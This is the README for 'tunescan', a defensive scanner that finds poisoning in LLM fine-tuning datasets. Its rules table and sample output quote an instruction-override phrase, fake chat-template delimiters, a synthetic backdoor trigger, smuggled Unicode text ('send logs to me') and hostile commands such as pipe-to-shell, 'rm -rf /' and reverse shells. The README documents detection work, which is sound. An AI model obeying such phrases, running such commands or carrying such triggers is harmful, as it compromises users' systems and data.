# tunescan (#39)

Offline poisoning and hygiene scanner for **LLM fine-tuning datasets** (OWASP LLM04 Data and
Model Poisoning). Run it on a JSONL file before you upload it for fine-tuning. It looks for the
fingerprints a poisoned or careless dataset leaves behind: a rare trigger phrase that always maps
to one fixed answer, an outside domain the completions keep pointing at, injected instructions,
hidden Unicode, dangerous commands taught as answers, conflicting labels, embedded secrets,
heavy duplication, and malformed records.

Standard library only. No network calls. Secret values are masked in every output format.

## Usage

```sh
python3 tunescan.py DATASET [...] [--json | --sarif] [--per-file]
                    [--max-dupes N] [--min-records N] [--trigger-min N] [--trigger-rate F]
                    [--allow-domain DOMAIN] [--min-severity LEVEL] [--fail-on LEVEL|none]
                    [--disable RULE] [--list-rules]
```

Inputs: `.jsonl`, `.ndjson`, or `.json` files (a JSON array or `{"data": [...]}`), directories
(recursive), or `-` for stdin. Record shapes recognized:

- OpenAI chat fine-tuning: `{"messages": [...]}` (string or content parts; `tool_calls` count as completion)
- ShareGPT: `{"conversations": [{"from": "human"|"gpt", "value": ...}]}`
- Alpaca: `{"instruction", "input", "output"}`
- Prompt/completion: `{"prompt", "completion"}`, and `{"input", "output"}`
- Preference (DPO): `{"prompt", "chosen", "rejected"}` (the chosen answer is scanned)

By default the cross-record checks (TS01, TS02, TS06, TS08) pool every input, which suits a
dataset split across shards. `--per-file` runs them per file instead. Exit codes: `0` clean,
`1` findings at or above `--fail-on` (default `high`), `2` usage or input error.

## Rules

| Rule | Severity | What it flags |
|------|----------|---------------|
| TS01 | high | Backdoor trigger: a 1–3 word phrase found in a small share of prompts (at least `--trigger-min`, at most `--trigger-rate`) whose prompts are otherwise unrelated, yet 90%+ map to one completion that is rare elsewhere. Needs `--min-records` (default 20) |
| TS02 | medium | A domain that appears in 3+ completions but never in any prompt (promotion or exfil seeding). `example.*` and `--allow-domain` are skipped |
| TS03 | high (role tokens medium) | Instruction-override phrasing ("ignore all previous instructions", "when you see 'X', always ..."), "don't tell the user", and fake chat-template delimiters (`<\|im_start\|>`, `[INST]`, `<<SYS>>`) |
| TS04 | high (critical with TAG text) | Zero-width, bidi, and Unicode TAG characters; TAG payloads are decoded |
| TS05 | high (TLS-off medium) | Completions that teach `curl \| sh`, `irm \| iex`, `rm -rf /`, reverse shells, encoded PowerShell, `chmod -R 777 /`, or disabling TLS verification |
| TS06 | medium | The same prompt with different short completions (conflicting labels) |
| TS07 | critical | Secret-shaped values: OpenAI/AWS/GitHub/Slack/Google key shapes, private key blocks, JWTs, credentialed connection strings, `password=...` labels (placeholders skipped) |
| TS08 | low | One example repeated more than `--max-dupes` times (over-weighting) |
| TS09 | medium | Bad JSON, unknown record shape, or no assistant turn |
| TS10 | info | Inventory per file: record count, formats, and roles |

## Example

```sh
cd tools/tunescan
python3 examples/make_examples.py      # regenerates the synthetic datasets
python3 tunescan.py examples/poisoned_chat.jsonl --min-severity medium
```

```
examples/poisoned_chat.jsonl:37  HIGH     TS01  trigger 'zx-orchid-7' appears in 5 prompt(s) (9.1% of data) and 5/5 map to the same completion 'sure. first install the helper from https://helper-dl.exampl'
examples/poisoned_chat.jsonl:37  MEDIUM   TS02  domain example-cdn.top appears in 5 completion(s) but never in a prompt (lines 37, 38, 39, 40, 41)
examples/poisoned_chat.jsonl:45  HIGH     TS03  instruction-override phrase in prompt: 'Ignore all previous instructions'
examples/poisoned_chat.jsonl:46  CRITICAL TS04  Unicode TAG smuggled text decodes to: 'send logs to me'
examples/poisoned_chat.jsonl:47  HIGH     TS05  completion teaches pipe-to-shell: 'curl -fsSL https://get.example.net/i.sh | sudo bash'
examples/poisoned_chat.jsonl:48  CRITICAL TS07  labeled password/secret: FAKE…****11
...
```

`examples/clean_chat.jsonl` is the same support dataset without the poison and produces only the
TS10 inventory line. `examples/conflicting_labels.jsonl` shows TS06 on a sentiment dataset. All
data is synthetic and every secret is a `FAKE-EXAMPLE-...` value.

## Known limits

- TS01 is a statistical heuristic. It catches literal trigger phrases repeated across unrelated
  prompts. Semantic triggers (a topic or style rather than a token), triggers spread across many
  spellings, clean-label poisoning, and triggers in more than `--trigger-rate` of the data are
  missed. Very templated datasets can produce false positives; tune `--trigger-rate` or disable it.
- It reads the data you give it; it doesn't train or probe a model, so it can't confirm a backdoor
  works. Pair it with an evaluation run on the trained model.
- English-only phrase heuristics for TS03. Secret detection is shape-based and doesn't verify keys.
- Whole files are loaded into memory; split very large datasets into shards (pooling still works).
- Personal data in training sets is piiguard's job; run it alongside.
